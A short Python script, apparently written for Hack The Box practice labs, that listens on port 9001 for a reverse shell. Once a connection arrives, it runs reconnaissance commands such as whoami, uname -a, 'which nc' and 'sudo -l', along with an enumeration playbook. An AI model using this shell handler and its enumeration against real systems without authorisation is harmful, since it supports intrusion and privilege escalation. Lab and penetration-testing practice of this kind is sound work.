import playbooks.enumerate_dependencies
import pheelshell
import pwn
import utilities

LISTENING_PORT = 9001

def main():
    # Picks the local IP for HTB. Give the option to the user in the future.
    attacker_ip = None
    ipv4s = utilities.fetch_ipv4_addresses()
    for ipv4 in ipv4s:
        if ipv4.startswith('10.10.14'):
            attacker_ip = ipv4
            break

    short_commands = [
        'whoami',
        'hostname',
        'uname -a',
        'which nc'
    ]

    long_commands = [
        'sudo -l'
    ]

    active_playbooks = [
        playbooks.enumerate_dependencies.EnumerateDependencies()
    ]

    commands_output = {}
    print(f'Listening {attacker_ip}:{LISTENING_PORT}...')
    with pwn.listen(LISTENING_PORT).wait_for_connection() as client:
        shell = pheelshell.PheelShell(client, b'$ ', attacker_ip)

        for command in short_commands:
            output = shell.send_command_read_output(command.encode(), single_line_output=True)
            commands_output[command] = output

        for command in long_commands:
            output = shell.send_command_read_cached_temporary_file(command)
            commands_output[command] = output
        
        for playbook in active_playbooks:
            playbook = shell.run_playbook(playbook)
    
    for command, output in commands_output.items():
        print(f'{command}\n--------\n{output}\n--------\n')
    
    for playbook in active_playbooks:
        print(str(playbook))

if __name__ == '__main__':
    main()
